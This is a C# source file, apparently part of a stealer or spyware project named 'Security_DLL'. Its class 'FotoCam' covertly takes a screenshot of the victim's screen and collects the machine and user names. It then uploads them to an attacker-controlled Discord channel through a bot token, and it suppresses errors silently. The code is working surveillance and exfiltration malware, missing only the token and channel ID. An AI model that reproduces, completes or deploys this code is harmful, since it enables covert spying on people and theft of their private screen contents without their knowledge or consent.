using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Security_DLL
{
    internal class FotoCam
    {
        private static readonly string BotToken = "";
        private static readonly ulong CanalID = 0;

        public static async Task TomarFotoYEnviar()
        {
            try
            {
                string pcName = Environment.MachineName;
                string userName = Environment.UserName;

                await EnviarMensajeADiscord($"📸 **FOTO DE PANTALLA** 📸\n**PC:** {pcName}\n**Usuario:** {userName}\n**Hora:** {DateTime.Now}");

                // Tomar captura de pantalla
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(screenshot))
                    {
                        g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                    }

                    string tempPath = Path.GetTempFileName() + ".jpg";
                    screenshot.Save(tempPath, ImageFormat.Jpeg);

                    await EnviarFotoADiscord(tempPath);
                    File.Delete(tempPath);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static async Task EnviarFotoADiscord(string rutaFoto)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");

                    byte[] imageData = File.ReadAllBytes(rutaFoto);

                    using (var formData = new MultipartFormDataContent())
                    {
                        var fileContent = new ByteArrayContent(imageData);
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                        formData.Add(fileContent, "file", $"foto_{DateTime.Now:HHmmss}.jpg");

                        string url = $"https://discord.com/api/v10/channels/{CanalID}/messages";
                        await client.PostAsync(url, formData);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static async Task EnviarMensajeADiscord(string mensaje)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var payload = new { content = mensaje };
                    string jsonPayload = Newtonsoft.Json.JsonConvert.SerializeObject(payload);
                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                    string url = $"https://discord.com/api/v10/channels/{CanalID}/messages";
                    client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");

                    await client.PostAsync(url, content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}